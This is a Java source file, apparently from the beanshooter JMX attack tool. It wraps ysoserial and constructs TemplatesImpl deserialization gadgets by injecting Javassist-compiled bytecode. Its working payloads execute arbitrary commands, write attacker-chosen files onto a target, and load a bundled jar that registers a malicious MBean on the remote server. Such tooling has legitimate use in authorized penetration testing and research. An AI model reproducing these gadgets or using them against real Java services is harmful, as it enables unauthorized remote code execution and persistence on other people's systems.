package de.qtc.beanshooter.utils;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;

import org.apache.commons.io.IOUtils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import de.qtc.beanshooter.cli.ArgumentHandler;
import de.qtc.beanshooter.exceptions.ExceptionHandler;
import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.mbean.MBean;
import de.qtc.beanshooter.operation.BeanshooterOption;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

/**
 * Wrapper around ysoserial. Is used to validate the path to the ysoserial jar file and to create gadgets.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
@SuppressWarnings("restriction")
public class YsoIntegration
{
    /**
     * For beanshooters standard action, we use the YsoIntegration class to also create the required
     * payload objects of type TemplateImpl. Ysoserial only supports a generic command execution version
     * of the template. beanshooter adds some additional one. Since a full ysoserial integration is not
     * necessary for only the template object creation, we do it our own and copy the relevant code from
     * the ysoserial project.
     *
     * The following array contains the available template objects.
     */
    private static final String[] templateGadgets = new String[] { "template-exec", "template-upload", "template-tonka" };

    /**
     * Just a small wrapper around the URLClassLoader creation. Checks the existence of the specified file
     * path before creating a class loader around it.
     *
     * @return URLClassLoader for ysoserial classes
     * @throws MalformedURLException when the specified file system path exists, but is invalid
     */
    private static URLClassLoader getClassLoader() throws MalformedURLException
    {
        File ysoJar = new File((String)ArgumentHandler.require(BeanshooterOption.YSO));

        if (!ysoJar.exists())
        {
            ExceptionHandler.ysoNotPresent(BeanshooterOption.YSO.getValue());
        }

        return new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});
    }

    /**
     * Loads ysoserial using and separate URLClassLoader and invokes the makePayloadObject function by using
     * reflection. The result is a ysoserial gadget as it would be created on the command line.
     *
     * If the requested gadget is contained within templateGadgets, we create the gadget on our own (of course
     * still with the help of the ysoserial source code - copy & paste).
     *
     * @param gadget name of the desired gadget
     * @param command command specification for the desired gadget
     * @return ysoserial gadget
     */
    public static Object getPayloadObject(String gadget, String command)
    {
        Object ysoPayload = null;

        if (Arrays.asList(templateGadgets).contains(gadget))
        {
            return getTemplateGadget(gadget, command);
        }

        try
        {
            URLClassLoader ucl = getClassLoader();

            Class<?> yso = Class.forName("ysoserial.payloads.ObjectPayload$Utils", true, ucl);
            Method method = yso.getDeclaredMethod("makePayloadObject", new Class[] {String.class, String.class});

            Logger.print("Creating ysoserial payload...");
            ysoPayload = method.invoke(null, new Object[] {gadget, command});
        }

        catch( Exception  e)
        {
            Logger.printlnPlain(" failed.");
            Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during gadget generation.");
            Logger.eprintMixedBlue("You probably specified", "a wrong gadget name", "or an ");
            Logger.eprintlnPlainBlue("invalid gadget argument.");
            ExceptionHandler.showStackTrace(e);
            Utils.exit();
        }

        Logger.printlnPlain(" done.");
        return ysoPayload;
    }

    /**
     * Create the requested template gadget.
     *
     * @param gadget  the gadget to create
     * @param command  command to pass to the gadget
     * @return TemplateImpl object that performs the requested action
     */
    private static Object getTemplateGadget(String gadget, String command)
    {
        if (gadget.equals("template-tonka"))
            return getTonkaTemplateGadget();

        else if (gadget.equals("template-exec"))
            return getCommandTemplateGadget(command);

        else if (gadget.equals("template-upload"))
            return getUploadTemplateGadget(command);

        ExceptionHandler.internalError("getTemplateGadget", "A non existing gadget was requested.");
        return null;
    }

    /**
     * Returns a TemplateImpl gadget that deploys the tonka bean on the target server.
     *
     * @return TemplateImpl object that deploys the tonka bean on the target server
     * @throws IOException
     */
    private static Object getTonkaTemplateGadget()
    {
        byte[] content = null;
        String base64 = null;

        InputStream stream = YsoIntegration.class.getResourceAsStream("/" + MBean.TONKA.getJarName());

        if (stream == null)
        {
            Logger.printlnMixedYellow("Unable to find", MBean.TONKA.getJarName(), "within beanshooter.jar.");
            Logger.printlnMixedBlue("This", "is not", "supposed to happen.");
            Utils.exit();
        }

        try
        {
            content = IOUtils.toByteArray(stream);
        }

        catch (IOException e)
        {
            Logger.printlnMixedYellow("Caught unexpected", "IOException", "while reading " + MBean.TONKA.getJarName() + ".");
            Utils.exit();
        }

        base64 = new String(Base64.getEncoder().encode(content));

        // Create a temporary file where the TonkaBean Jar file is uploaded
        String java = "java.io.File f = java.io.File.createTempFile(\"tonka-bean\", \".jar\");";

        // Upload the TonkaBean Jar file
        java += String.format("java.nio.file.Files.write(f.toPath(), "
                            + "java.util.Base64.getDecoder().decode(\"%s\"), "
                            + "new java.nio.file.StandardOpenOption[0]);", base64);

        // Create an URLClassLoader and use it load the TonkaBean Jar
        java += "java.net.URLClassLoader ucls = new java.net.URLClassLoader(new java.net.URL[] {f.toURI().toURL()});";
        java += "Class tonkaBeanClass = java.lang.Class.forName(\"de.qtc.beanshooter.tonkabean.TonkaBean\", true, ucls);";

        // Create a new instance of the TonkaBean and register it to the MBean server
        java += "Object instance = tonkaBeanClass.newInstance();";
        java += String.format("java.lang.management.ManagementFactory.getPlatformMBeanServer().registerMBean(instance, "
                + "new javax.management.ObjectName(\"%s\"));", MBean.TONKA.getObjectName().toString());

        // Delete the temporary file
        java += "f.delete();";

        return templateGadgetFromJava(java);
    }

    /**
     * Returns a TemplateImpl gadget that uploads a file. The gadget command is expected
     * to be of the structure "source:destination".
     *
     * @param command  the upload command - format should be <SRC>:<DST>
     * @return TemplateImpl object that uploads a file.
     */
    private static Object getUploadTemplateGadget(String command)
    {
        String base64 = null;
        String[] split = command.split(":");

        if (split.length != 2)
        {
            Logger.eprintlnMixedYellow("Invalid upload parameter:", command);
            Logger.eprintlnMixedBlue("The expected format is:", "<SRC>:<DST>");
            Utils.exit();
        }

        try
        {
            byte[] content = Files.readAllBytes(Paths.get(split[0]));
            base64 = new String(Base64.getEncoder().encode(content));
        }

        catch (IOException e)
        {
            ExceptionHandler.handleFileRead(e, split[0], true);
        }

        String java = String.format("java.nio.file.Files.write(new java.io.File(\"%s\").toPath(), "
                                    + "java.util.Base64.getDecoder().decode(\"%s\"), "
                                    + "new java.nio.file.StandardOpenOption[0]);", split[1], base64);

        return templateGadgetFromJava(java);
    }

    /**
     * Returns a TemplateImpl gadget that executes a command. This is basically the
     * version implemented by ysoserial.
     *
     * @param command  the command to execute
     * @return TemplateImpl object that executes a command
     */
    private static Object getCommandTemplateGadget(String command)
    {
        String java = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");";

        return templateGadgetFromJava(java);
    }

    /**
     * Generate a TemplateImpl object that executes the specified Java code on
     * transformation. This function is basically a copy of ysoserials createTemplatesImpl.
     *
     * source: https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java#L106
     *
     * Different licensing may apply.
     *
     * @param java  the java code to execute when a transformation occurs
     * @return TemplateImpl object that executes the specified Java code on transformation
     */
    private static Object templateGadgetFromJava(String java)
    {
        byte[] payloadBytes = null;
        byte[] dummyBytes = null;

        try
        {
            ClassPool pool = ClassPool.getDefault();

            CtClass payloadClass = pool.makeClass("de.qtc.beanshooter.utils.TransletPayloadStub" + System.nanoTime());
            payloadClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            payloadClass.addInterface(pool.getCtClass(Serializable.class.getName()));
            payloadClass.makeClassInitializer().insertAfter(java);

            CtClass dummyClass = pool.makeClass("de.qtc.beanshooter.utils.Foo" + System.nanoTime());
            dummyClass.addInterface(pool.getCtClass(Serializable.class.getName()));

            payloadBytes = payloadClass.toBytecode();
            dummyBytes = dummyClass.toBytecode();
        }

        catch (NotFoundException | CannotCompileException | IOException e)
        {
            Logger.printlnMixedYellow("Caught", e.getClass().getName(), "during dynamic class generation.");
            ExceptionHandler.showStackTrace(e);
            Utils.exit();
        }

        return createTemplateGadget(payloadBytes, dummyBytes);
    }

    /**
     * Helper class to generate TemplateImpl objects. This function is basically a copy of
     * ysoserials createTemplatesImpl.
     *
     * source: https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java#L106
     *
     * Different licensing may apply.
     *
     * @param payloadBytes  bytecode of the payload class to place within the Template
     * @param dummyBytes  bytecode of a dummy class
     * @return TemplateImpl object that contains the specified bytecodes
     */
    @SuppressWarnings("deprecation")
    private static Object createTemplateGadget(byte[] payloadBytes, byte[] dummyBytes)
    {
        final TemplatesImpl template = new TemplatesImpl();

        Field bytecodeField;
        try
        {
            bytecodeField = template.getClass().getDeclaredField("_bytecodes");
            bytecodeField.setAccessible(true);
            bytecodeField.set(template, new byte[][] { payloadBytes, dummyBytes});

            Field nameField = template.getClass().getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(template, "Pwnr");

            Field templateField = template.getClass().getDeclaredField("_tfactory");
            templateField.setAccessible(true);
            templateField.set(template, TransformerFactoryImpl.class.newInstance());
        }

        catch (NoSuchFieldException | SecurityException | IllegalArgumentException | IllegalAccessException | InstantiationException e)
        {
            Logger.printlnMixedYellow("Caught", e.getClass().getName(), "while creating TemplatesIml object.");
            ExceptionHandler.showStackTrace(e);
            Utils.exit();
        }

        return template;
    }
}
